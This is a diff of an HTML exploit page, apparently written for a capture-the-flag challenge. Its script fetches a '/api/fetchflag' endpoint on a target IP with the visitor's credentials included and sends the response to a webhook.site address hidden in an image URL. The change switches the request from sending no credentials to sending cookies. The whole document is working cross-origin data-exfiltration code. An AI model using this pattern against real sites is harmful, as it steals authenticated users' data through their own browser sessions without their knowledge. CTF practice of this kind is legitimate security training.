@@ -2,16 +2,18 @@
 <html>
 <body>
 <script>
-// Test fetch to target API without credentials
-fetch('http://95.217.6.37:20001/api/fetchflag')
+// Test fetch to target API WITH credentials
+fetch('http://95.217.6.37:20001/api/fetchflag', {
+    credentials: 'include'
+})
 .then(r => r.text())
 .then(txt => {
     var img = new Image();
-    img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?no_creds=' + encodeURIComponent(txt.substring(0, 100));
+    img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?with_creds=' + encodeURIComponent(txt.substring(0, 100));
 })
 .catch(err => {
     var img = new Image();
-    img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?no_creds_err=' + encodeURIComponent(err.toString());
+    img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?with_creds_err=' + encodeURIComponent(err.toString());
 });
 </script>
 </body>
